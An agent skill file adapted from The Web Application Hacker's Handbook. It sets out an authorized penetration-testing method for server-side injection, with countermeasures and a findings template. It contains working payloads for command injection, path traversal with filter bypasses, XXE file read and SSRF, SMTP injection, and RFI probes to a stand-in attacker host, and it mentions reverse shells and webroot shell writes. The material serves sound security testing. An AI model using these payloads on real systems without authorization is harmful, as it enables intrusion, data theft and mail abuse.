---
name: server-side-injection-testing
description: |
  Test web application back-end components for non-SQL server-side injection vulnerabilities. Use this skill when: testing for OS command injection via shell metacharacters (pipe, ampersand, semicolon, backtick) or dynamic execution functions (eval/exec/Execute); detecting blind command injection using time-delay technique (ping -i 30 loopback) when output is not reflected; probing for path traversal vulnerabilities including filter bypass via URL encoding, double encoding, 16-bit Unicode, overlong UTF-8, null byte injection, or non-recursive strip bypass; testing for Local File Inclusion or Remote File Inclusion; identifying XML External Entity (XXE) injection for local file read or Server-Side Request Forgery (SSRF); detecting SOAP injection via XML metacharacter probing; testing for HTTP Parameter Injection (HPI) and HTTP Parameter Pollution (HPP) in back-end HTTP requests; identifying SMTP injection through email header manipulation or SMTP command injection in mail submission forms. Covers detection procedures, filter bypass techniques, exploitation impact, and prevention countermeasures. Maps to CWE-78 (OS Command Injection), CWE-22 (Path Traversal), CWE-98 (File Inclusion), CWE-611 (XXE), CWE-91 (XML Injection), CWE-88 (Argument Injection), CWE-93 (SMTP Injection). For authorized security testing, security code review, and defensive hardening contexts.
version: 1.0.0
homepage: https://github.com/bookforge-ai/bookforge-skills/tree/main/books/web-application-hackers-handbook/skills/server-side-injection-testing
metadata: {"openclaw":{"emoji":"📚","homepage":"https://github.com/bookforge-ai/bookforge-skills"}}
status: draft
depends-on: []
source-books:
  - id: web-application-hackers-handbook
    title: "The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws"
    authors: ["Dafydd Stuttard", "Marcus Pinto"]
    edition: 2
    chapters: [10]
    pages: "357-402"
tags: [command-injection, path-traversal, file-inclusion, lfi, rfi, xxe, xml-injection, soap-injection, http-parameter-injection, hpp, smtp-injection, server-side-injection, penetration-testing, appsec, owasp, cwe-78, cwe-22, cwe-611, cwe-91, cwe-93]
execution:
  tier: 2
  mode: hybrid
  inputs:
    - type: codebase
      description: "Application source code — server-side handlers, file access APIs, XML parsing, mail functions, HTTP client calls — primary for white-box mode"
    - type: document
      description: "HTTP traffic captures, Burp Suite session logs, security reports — primary for black-box mode"
  tools-required: [Read, Grep, Write]
  tools-optional: [Bash, WebFetch]
  mcps-required: []
  environment: "Run inside a project codebase for white-box code review, or with HTTP traffic logs for black-box assessment. Authorized testing context required."
discovery:
  goal: "Identify all exploitable non-SQL server-side injection vulnerabilities across OS command injection, path traversal, file inclusion, XXE, SOAP injection, HTTP parameter injection, and SMTP injection; produce a structured findings report with severity, evidence, and countermeasures"
  tasks:
    - "Map all attack surface points: file access parameters, OS command invocations, XML input, SOAP endpoints, back-end HTTP proxying, mail submission forms"
    - "Test each vulnerability class systematically using the detection procedures below"
    - "Apply filter bypass techniques when initial traversal or injection is blocked"
    - "Document findings with CWE mapping, severity, evidence, and countermeasures"
  audience:
    roles: ["penetration-tester", "application-security-engineer", "security-minded-developer", "bug-bounty-researcher"]
    experience: "intermediate-to-advanced — assumes familiarity with HTTP, web proxies (Burp Suite or equivalent), shell metacharacters, and basic XML"
  triggers:
    - "Penetration test of a web application with file upload/download, admin command interfaces, or mail forms"
    - "Security code review targeting server-side input handling"
    - "Assessment of API endpoints that accept filenames, XML bodies, or proxied URLs"
    - "Post-incident analysis of a server compromise or SSRF event"
  not_for:
    - "SQL injection — use a dedicated SQL injection assessment skill"
    - "Client-side injection (XSS, HTML injection) — different attack surface"
    - "Authentication or session management testing — separate skill scope"
---

# Server-Side Injection Testing

## When to Use

You have authorized access to a web application and need to test its back-end components for injection vulnerabilities that do not involve SQL databases.

This skill applies when:
- A penetration test or code review targets functionality that passes user input to OS commands, filesystem APIs, XML parsers, SOAP services, back-end HTTP requests, or mail servers
- Parameters in URLs, POST bodies, or cookies contain filenames, directory names, hostnames, or structured data (XML, SOAP) that is processed server-side
- You observe file retrieval behavior (`?file=`, `?template=`, `?include=`), admin functionality, or feedback/contact forms
- You need to bypass input validation filters protecting file path operations

**The foundational insight:** Web applications act as intermediaries between users and a variety of powerful back-end components. Each component speaks a different language with different metacharacters and escape semantics. Data that is safe in HTTP can be dangerous when interpreted by a shell, an XML parser, a filesystem API, or an SMTP server. An attacker who controls what these components receive can often go far beyond what the application intended — reading arbitrary files, executing arbitrary commands, or pivoting to internal network services.

**Authorized testing only.** This skill is for security professionals with explicit written authorization to test the target application.

---

## Context and Input Gathering

### Required Context

- **Testing mode (black-box vs white-box):**
  Why: white-box testing enables direct identification of dangerous API calls (`exec`, `include`, `mail()`), dynamic execution patterns, and XML parsing configuration; black-box testing relies on behavioral probing only.
  - If missing, ask: "Do you have access to the application's source code, or is this a black-box behavioral test?"

- **Application technologies:**
  Why: shell metacharacters differ between Unix and Windows; PHP `include()` enables Remote File Inclusion while ASP `Server.Execute` supports only Local File Inclusion; dynamic execution (`eval`) behavior is language-specific.
  - Check for: `package.json`, `requirements.txt`, `pom.xml`, framework config files, server banners

- **Scope of testable parameters:**
  Why: any parameter — query string, POST body, cookie, HTTP header — may be passed to a back-end component. Incomplete scope means missed findings.
  - If missing, assume all parameters in all requests are in scope

### Observable Context (gather from environment)

- File access patterns: parameters named `file`, `filename`, `path`, `template`, `include`, `page`, `lang`, `country`
- OS command invocations: source code calls to `exec`, `shell_exec`, `system`, `popen`, `Process.Start`, `wscript.shell`, `Runtime.exec`
- XML input: `Content-Type: text/xml` or `application/xml` in requests, AJAX endpoints processing XML bodies
- Mail forms: feedback, contact, report-a-problem forms with email address and subject fields
- Back-end HTTP proxying: parameters containing hostnames, IP addresses, or full URLs

---

## Process

### Step 1: Map the Attack Surface

**ACTION:** Enumerate all parameters and input channels across every application function, looking for the following high-value targets: (a) parameters that appear to specify files or directories; (b) admin interfaces for server management (disk usage, process listing, network diagnostics); (c) XML-based endpoints (AJAX, REST with XML bodies, SOAP services); (d) feedback or contact forms; (e) parameters that appear in back-end HTTP requests (look for `loc=`, `url=`, `host=` parameters).

**WHY:** Server-side injection vulnerabilities do not cluster in predictable locations. OS command injection is common in admin interfaces. Path traversal appears wherever file retrieval occurs. SMTP injection only exists in mail submission functions. A systematic surface map prevents missing entire vulnerability classes. Any parameter in any request — including cookies — may be passed to a vulnerable back-end component.

**AGENT: EXECUTES** — Grep source code for dangerous API calls and file access patterns; catalog parameters from HTTP traffic.

```
# White-box: grep for dangerous calls
exec|shell_exec|system|popen|passthru|eval|include\(|require\(
Process\.Start|wscript\.shell|Runtime\.exec
mail\(|smtp|sendmail
file_get_contents|fopen|readfile|include_path
XmlDocument|DocumentBuilder|SAXParser|XMLReader
```

---

### Step 2: Test for OS Command Injection

**ACTION:** For each parameter likely involved in OS command execution, submit the following all-purpose time-delay probe. Monitor response time — a ~30-second delay indicates successful injection:

```
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
```

If the application may be filtering specific separators, also submit each of these individually and monitor timing:

```
| ping -i 30 127.0.0.1 |
| ping -n 30 127.0.0.1 |
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping -i 30 127.0.0.1 %0a
` ping 127.0.0.1 `
```

**WHY:** Time-delay inference is the most reliable blind detection technique. When injected commands produce no output visible in the response — because results are discarded, because output is batched, or because the injection runs in a separate process — timing is the only reliable signal. The ping command is the canonical probe because it produces a predictable, controllable delay on both Unix (`-i` interval) and Windows (`-n` count). Testing multiple separators maximizes detection probability when the application filters some.

**IF** time delay is confirmed → repeat test 2-3 times varying `-n`/`-i` values to rule out network latency anomalies.

**IF** timing is confirmed → attempt retrieval of output by:
1. Injecting a command that writes to the web root: `dir > C:\inetpub\wwwroot\foo.txt` or `ls > /var/www/html/foo.txt`
2. Using out-of-band exfiltration: TFTP to retrieve tools, netcat reverse shell, `mail` command to send output via SMTP
3. Determining privilege level: inject `whoami` or `id` and exfiltrate result

**IF** full command injection is blocked → test for parameter injection: insert a space followed by a new command-line flag (e.g., if the app calls `wget [url]`, try appending `-O /path/to/webroot/shell.asp`). Also test whether `<` and `>` are allowed for file redirection.

---

### Step 3: Test for Dynamic Execution Injection

**ACTION:** For any parameter that may be passed to `eval()`, `Execute()`, or similar dynamic execution functions, submit these detection probes as each targeted parameter value:

```
;echo%20111111
echo%20111111
response.write%20111111
;response.write%20111111
```

**WHY:** Dynamic execution vulnerabilities arise when user input is incorporated into code strings executed at runtime by `eval` (PHP, Perl), `Execute()` (classic ASP), or similar constructs. These differ from shell injection — the injected code is interpreted by the scripting engine, not a shell, so different metacharacters apply. The semicolon terminates the preceding statement and begins a new one. If `111111` appears in the response without the rest of the submitted command string, the input is being executed as code.

**IF** `111111` is returned alone → the application is vulnerable to scripting command injection. Confirm with a time-delay: submit `system('ping%20127.0.0.1')` (PHP) or equivalent.

**IF** PHP is suspected → also try `phpinfo()` to obtain configuration details.

---

### Step 4: Test for Path Traversal

**ACTION:** For each parameter that specifies a filename or directory:

**Step 4a — Detect traversal handling.** Modify the parameter to insert a subdirectory and a single traversal sequence that returns to the same location. If the application uses `file=foo/file1.txt`, submit `file=foo/bar/../file1.txt`. If both return identical behavior, the application is likely processing traversal sequences without blocking them — proceed to Step 4b.

**Step 4b — Traverse above the start directory.** Submit a long traversal sequence targeting a known world-readable file:

```
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../windows/win.ini
```

Use many sequences — the starting directory may be deep in the filesystem; redundant `../` sequences are harmless once the root is reached. Try both forward slashes and backslashes.

**WHY:** Path traversal vulnerabilities occur when user-controlled data is incorporated into filesystem API calls without proper canonicalization and validation. The `../` sequence (dot-dot-slash) instructs the filesystem to move up one directory. An application that constructs a path as `C:\filestore\` + user_input and opens the result will read any file accessible to the web server process if the user_input contains `..\..\windows\win.ini`. The consequences range from sensitive file disclosure (credentials, source code, configuration) to arbitrary file write (which can lead to code execution).

**Step 4c — Bypass filters.** If naive traversal is blocked, see [path-traversal-bypass-matrix.md](references/path-traversal-bypass-matrix.md) for the full bypass sequence. Key techniques:
- URL encoding: `%2e%2e%2f` (dot-dot-slash), `%2e%2e%5c` (dot-dot-backslash)
- Double URL encoding: `%252e%252e%252f`
- 16-bit Unicode: `%u002e%u002e%u2215`
- Overlong UTF-8: `%c0%ae%c0%ae%c0%af`
- Non-recursive strip bypass: `....//` or `....\/` (inner `../` is stripped, leaving `../`)
- Null byte injection: `../../../../etc/passwd%00.jpg` (truncates file type suffix check)
- Prefix bypass: `filestore/../../../../../etc/passwd` (satisfies starts-with check)

**Step 4d — Test write access.** If the parameter is used for file writing, test with a pair: one file that should be writable (`../../../tmp/writetest.txt`) and one that should not (`../../../windows/system32/config/sam`). Different behavior between the two confirms a write traversal vulnerability.

**WHY write access matters:** An attacker with write traversal can create scripts in users' startup folders, modify `in.ftpd` to execute commands on connect, or write scripts to a web-accessible directory for immediate execution via browser request.

---

### Step 5: Test for File Inclusion (Local and Remote)

**ACTION — Remote File Inclusion (RFI):** Submit a URL pointing to a server you control as the value of any parameter likely used in an `include()` or `require()` call. Monitor your server for an incoming HTTP request.

```
?page=http://your-server.com/probe
?Country=http://your-server.com/probe
```

If no connection arrives, submit a URL pointing to a nonexistent IP address and observe whether the application hangs (connection timeout indicates the server attempted to fetch the URL).

**WHY:** PHP `include()` and `require()` accept remote URLs by default unless `allow_url_include` is disabled. An attacker who can control the included URL can host a malicious PHP script on a server they control and have the vulnerable application execute it. The script runs with full server-side privileges.

**ACTION — Local File Inclusion (LFI):** Submit the name of a known server-side executable or static resource that the application is unlikely to expose via a direct URL.

1. Submit the name of a known executable resource (e.g., `/admin/config.php`) and observe whether the application's behavior changes.
2. Submit the name of a known static resource and check whether its contents appear in the response.
3. If LFI is confirmed, combine with path traversal techniques (Step 4c) to access files outside the application directory.

**WHY:** Local File Inclusion allows an attacker to cause sensitive server-side files to be executed or their contents disclosed within application responses. Files protected by application-level access controls (e.g., `/admin/`) may be accessible via LFI even when direct HTTP access is blocked, because the include mechanism bypasses the web server's access control layer.

---

### Step 6: Test for XML External Entity (XXE) Injection

**ACTION:** Identify any endpoint that accepts XML input (look for `Content-Type: text/xml` or XML-formatted request bodies). Modify the request to add a DOCTYPE declaration defining an external entity that references a local file:

```xml
POST /search/ajaxsearch HTTP/1.1
Content-Type: text/xml

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```

Observe whether the response contains the contents of `/etc/passwd` (Unix) or `C:\windows\win.ini` (Windows) in place of the entity reference.

**WHY:** Standard XML parsing libraries support external entity resolution by default. When the application reflects any portion of the XML data in its response, entity content is substituted inline before the response is generated. An attacker who can define `SYSTEM "file:///etc/passwd"` as an entity and reference it in an echoed element receives the file contents in the response. This bypasses all application-level access control because the XML parser, not the application, fetches the file.

**IF** file contents are returned → the application is vulnerable to XXE-based local file read. Escalate by:
- Targeting sensitive files: `/etc/shadow`, application config files containing database credentials, source code files
- Using `http://` protocol instead of `file://` to perform SSRF — cause the server to make HTTP requests to internal network addresses not accessible from the Internet:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1:25" > ]>
```

**WHY SSRF matters:** Internal services (admin panels, databases, payment processors) often lack authentication because they are assumed to be unreachable from the Internet. An XXE-based SSRF condition allows the attacker to use the application server as a proxy into the internal network, scanning ports, retrieving service banners, and potentially exploiting vulnerabilities in internal services.

**IF** the entity is fetched but not reflected → test for Denial of Service using an indefinitely blocking resource:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///dev/random" > ]>
```

---

### Step 7: Test for SOAP Injection

**ACTION:** For each parameter that may be incorporated into a SOAP message:

1. Submit a rogue XML closing tag: `</foo>`. If the application returns an error, the input is likely being inserted into XML.
2. Submit a balanced tag pair: `<foo></foo>`. If the error disappears, injection into a SOAP message is likely.
3. Submit `test<foo/>` and `test<foo></foo>` in turn. If either is returned in the response normalized as the other (or as just `test`), input is being inserted into XML-based messaging.
4. If the request has multiple parameters, insert the XML opening comment `<!--` into one and the closing comment `-->` into another, then swap them. This can comment out portions of the server's SOAP message, potentially altering application logic.

**WHY:** SOAP messages use XML metacharacters (`<`, `>`, `/`) as structural delimiters. Unsanitized user input inserted directly into a SOAP message allows an attacker to add new XML elements, modify element values, or inject XML comments that suppress original elements. In the example of a funds transfer, injecting `<ClearedFunds>True</ClearedFunds>` before the server-generated `<ClearedFunds>False</ClearedFunds>` element may cause the back-end processor to read the attacker's value first and authorize the transfer.

**IF** SOAP structure is confirmed → look for error messages that disclose the full message structure. Use this to craft targeted injections that modify business logic elements (authorization flags, amounts, account identifiers).

---

### Step 8: Test for HTTP Parameter Injection and HTTP Parameter Pollution

**ACTION — HTTP Parameter Injection (HPI):** For each parameter that may be forwarded to a back-end HTTP request, attempt to inject additional parameters by appending URL-encoded parameter syntax:

```
%26foo%3dbar    — URL-encoded: &foo=bar
%3bfoo%3dbar    — URL-encoded: ;foo=bar
%2526foo%253dbar — Double URL-encoded: &foo=bar
```

Observe whether the application's behavior changes in a way that indicates the injected parameter is being processed by the back-end server (e.g., bypassing a validation check, triggering a different response).

**WHY:** When the front-end application copies user-supplied parameters into back-end HTTP requests without sanitizing URL metacharacters, an attacker can inject additional parameters. If the back-end service processes an injected parameter that overrides a security-critical flag (such as `clearedfunds=true` in a bank transfer), the attacker can bypass business logic controls that exist only in the front-end layer.

**ACTION — HTTP Parameter Pollution (HPP):** Determine how the target server handles duplicate parameter names. Submit the same parameter multiple times with different values, both before and after other parameters, and in query strings, cookies, and POST bodies. The server's behavior (using first value, last value, or concatenated value) determines where the attacker must place injected parameters.

**WHY:** When an attacker injects a parameter that already exists in the back-end request (creating a duplicate), HPP determines whether the injected value or the original value takes effect. Understanding the server's duplicate-parameter behavior is required to position the injection correctly.

---

### Step 9: Test for SMTP Injection

**ACTION:** Identify all application functions that send email (contact forms, feedback forms, account notifications). For each field you can supply (From address, Subject, message body), submit these test strings with your own email address substituted at the relevant positions:

```
<youremail>%0aCc:<youremail>
<youremail>%0d%0aCc:<youremail>
<youremail>%0aBcc:<youremail>
<youremail>%0d%0aBcc:<youremail>
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo%0a%2e%0a
```

Monitor the email address you specified — if any mail is received, the application is vulnerable. Also monitor for error messages that indicate the application is performing SMTP operations.

**WHY:** Applications that pass user-supplied input directly into SMTP conversations or mail() function parameters allow an attacker to inject additional email headers (Cc, Bcc, To) by inserting newline characters (`%0a` = LF, `%0d%0a` = CRLF). The SMTP protocol treats each line as a separate command or header. An attacker can cause the mail server to send messages to arbitrary recipients — enabling spam campaigns using the application's mail server, or sending phishing messages that appear to originate from the legitimate application domain.

**IF** header injection is confirmed → escalate to SMTP command injection: inject a complete new SMTP transaction by appending `DATA`, `MAIL FROM`, `RCPT TO`, and message body commands after the data terminator (a line containing only `.`). This produces entirely attacker-controlled messages originating from the server.

**NOTE:** Mail-related functions frequently invoke OS commands (sendmail, mail binaries). Also probe all mail-related parameters for OS command injection (Step 2) in addition to SMTP injection.

---

### Step 10: Document Findings and Map Countermeasures

**ACTION:** For each confirmed vulnerability, write a finding with: vulnerability class, CWE identifier, severity, evidence (request/response or code snippet), and countermeasure.

**WHY:** Findings without countermeasures are incomplete — they identify the problem without enabling the fix. Specific, actionable remediation aligned to the vulnerability mechanism enables developers to address root causes rather than applying superficial patches.

**Severity guidance:**
- **Critical:** OS command injection with confirmed code execution, RFI with confirmed remote code execution, write path traversal to web root
- **High:** Read path traversal (arbitrary file read), XXE with confirmed file read or SSRF, blind OS command injection
- **Medium:** SOAP injection affecting business logic, LFI, HPI/HPP bypassing validation, SMTP injection
- **Low:** Unconfirmed indicators, partial filter bypasses without confirmed impact

**Countermeasures by class:**

| Vulnerability | Primary Countermeasure |
|---|---|
| OS Command Injection | Avoid OS commands entirely; use built-in APIs. If unavoidable: allowlist input to alphanumeric only; use APIs that pass arguments separately (not shell strings) |
| Dynamic Execution Injection | Never pass user input to `eval()`/`Execute()`. Use allowlist validation if unavoidable |
| Path Traversal | Avoid passing user data to filesystem APIs. If required: decode and canonicalize input, check for traversal sequences, verify resolved path starts with expected base directory using `getCanonicalPath()` (Java) or `GetFullPath()` (.NET); use chroot environment |
| File Inclusion | Disable `allow_url_include` in PHP. Use a hardcoded map from identifiers to file paths; never pass user input directly to include/require |
| XXE | Disable external entity processing in the XML parser; use a local schema for validation |
| SOAP Injection | HTML-encode XML metacharacters (`<` → `&lt;`, `>` → `&gt;`, `/` → `&#47;`) in all user input before insertion into SOAP messages |
| HPI / HPP | Validate and sanitize parameters before forwarding to back-end requests; do not pass user input as raw parameter values into back-end URLs |
| SMTP Injection | Validate email addresses with a strict regular expression (rejecting newlines); strip newlines from Subject fields; disallow lines containing only `.` in message bodies |

---

## Inputs

- Target application URL(s) and any known parameter inventory
- HTTP proxy session / Burp Suite project file (black-box mode)
- Application source code — server-side handlers, file access, XML parsing, mail functions (white-box mode)
- Test account or anonymous access to exercise all application functions
- Scope confirmation from the authorizing party

## Outputs

**Server-Side Injection Assessment Report** containing:

```
# Server-Side Injection Assessment — [Application Name]
Date: [date]
Assessor: [name/team]
Mode: [black-box | white-box | hybrid]

## Executive Summary
[2-3 sentences: overall posture, highest severity finding, priority recommendation]

## Findings

### [FINDING-001] [Vulnerability Class] — [Parameter/Endpoint]
- CWE: CWE-XX
- Severity: [Critical | High | Medium | Low]
- Endpoint: [URL + parameter name]
- Evidence: [request/response excerpt or code snippet]
- Countermeasure: [specific remediation]

## Attack Surface Coverage
[Table: Class | Parameters Tested | Findings Count]
```

---

## Key Principles

- **The back-end component defines the attack surface — not the front-end validation.** A filter that strips `../` from URL parameters provides no protection if the filesystem API receives the unfiltered value from another source. Testing must target the component's input, not just the HTTP layer.

- **Time-delay inference is the most reliable blind detection technique.** When injected commands produce no visible output, timing is the only reliable signal. A 30-second delay from a ping command eliminates most false positives. Varying the delay duration (changing `-n`/`-i`) and repeating the test rules out network anomalies.

- **Filter bypass requires systematic escalation.** Applications that implement path traversal defenses often block naive `../` but fail against encoded variants. Work through encoding levels in order: plain → URL-encoded → double-encoded → Unicode → overlong UTF-8. Test non-recursive stripping separately. Combine traversal bypasses with file-type suffix bypasses when both filters are present.

- **XML parsers resolve external entities by default — this is the root cause of XXE.** XXE is not a coding mistake in the application layer; it is a misconfiguration of the XML parsing library. The fix is at the parser configuration level (disabling external entity resolution), not input validation.

- **SMTP injection targets the newline.** The SMTP protocol delimits commands and headers with newline characters. A single unvalidated newline in a From address or Subject field is sufficient to inject additional headers, additional recipients, or entirely new SMTP transactions.

- **Mail submission functions are consistently undertested.** Because they are peripheral to core application functionality, they receive less security scrutiny and are often implemented via direct OS command calls rather than mail APIs. Test mail functions for both SMTP injection and OS command injection.

---

## Examples

**Scenario: Penetration test of a web-based server administration panel**
Trigger: "We need a pentest of our admin portal before we open it to remote access. It includes disk usage reporting and file browsing."
Process:
1. Step 1: Map attack surface — identify `?dir=` parameter in disk usage function and `?filename=` parameter in file browser.
2. Step 2 (OS command injection): Submit `|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &` as `dir` value. Response takes 30 seconds — confirmed blind command injection (CWE-78, Critical). Confirm by varying delay to 10 seconds — response time changes proportionally.
3. Step 4 (path traversal): Submit `../../../../../../../../etc/passwd` as `filename` value — server returns `/etc/passwd` contents (CWE-22, High). Filter bypass not required.
4. Step 2 exfiltration: Inject `id > /var/www/html/tmp/out.txt` — retrieve `out.txt` via browser — confirms execution as `www-data`.
Output: 2 findings (Critical OS command injection, High path traversal). Countermeasures: replace shell call with `du` Python library; canonicalize filename parameter and verify it starts with expected base path.

---

**Scenario: Security code review of a PHP e-commerce application**
Trigger: "Review our codebase before the launch. We're concerned about injection risks in the file handling and the contact form."
Process:
1. Step 1: Grep for `include(`, `eval(`, `mail(`, `exec(`, `file_get_contents(` — finds `include($_GET['page'] . '.php')` in `main.php` and `mail($to, $subject, $message, "From: " . $_POST['email'])` in `contact.php`.
2. Step 5 (RFI): `include()` with user-supplied `page` parameter — no `allow_url_include` check. RFI confirmed in code (CWE-98, Critical). LFI also confirmed — path traversal bypass allows access to `../config/database.php`.
3. Step 6 (XXE): XML endpoint found using `SimpleXMLElement` — no `LIBXML_NOENT` flag disabling entity expansion. XXE confirmed in code (CWE-611, High).
4. Step 9 (SMTP injection): `mail()` `additional_headers` parameter built from `$_POST['email']` without newline stripping — email header injection confirmed (CWE-93, Medium).
Output: 4 findings (Critical RFI, High LFI+XXE, Medium SMTP injection). Countermeasures: disable `allow_url_include`, replace `include($page)` with allowlist map, configure XML parser with `LIBXML_NOENT`, validate email address against RFC5322 regex rejecting newlines.

---

**Scenario: Black-box assessment of an enterprise application with XML-based AJAX search**
Trigger: "Our AJAX search endpoint processes XML — can you check it for injection issues?"
Process:
1. Step 1: Intercept AJAX search request — `Content-Type: text/xml`, body `<Search><SearchTerm>test</SearchTerm></Search>`. Response echoes search term in XML result.
2. Step 6 (XXE): Inject DOCTYPE with external entity referencing `file:///etc/passwd` into SearchTerm element. Response contains `/etc/passwd` contents inline in `<SearchResult>` — confirmed XXE (CWE-611, Critical).
3. SSRF escalation: Replace `file://` with `http://10.0.0.1:8080/` — response contains internal admin panel HTML — confirmed SSRF reaching internal network (High, escalated to Critical combined finding).
4. Step 7 (SOAP injection): Separate endpoint — submit `</foo>` in each parameter — error indicates XML context. Submit `<foo></foo>` — error disappears. Inject `<ClearedFunds>True</ClearedFunds>` via Amount parameter — confirms SOAP injection (CWE-91, High).
Output: 2 findings (Critical XXE+SSRF, High SOAP injection). Countermeasures: configure XML parser to disable external entity resolution; HTML-encode all user input before SOAP message construction.

---

## References

- Bypass technique details: [path-traversal-bypass-matrix.md](references/path-traversal-bypass-matrix.md)
- Countermeasure implementation: [server-side-injection-countermeasures.md](references/server-side-injection-countermeasures.md)
- CWE and OWASP mapping: [injection-cwe-owasp-mapping.md](references/injection-cwe-owasp-mapping.md)
- Source: Stuttard, D. & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.), Chapter 10: "Attacking Back-End Components," pp. 357-402. Wiley.

## License

This skill is licensed under [CC-BY-SA-4.0](https://creativecommons.org/licenses/by-sa/4.0/).
Source: [BookForge](https://github.com/bookforge-ai/bookforge-skills) — The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws by Dafydd Stuttard, Marcus Pinto.

## Related BookForge Skills

This skill is standalone. Browse more BookForge skills: [bookforge-skills](https://github.com/bookforge-ai/bookforge-skills)
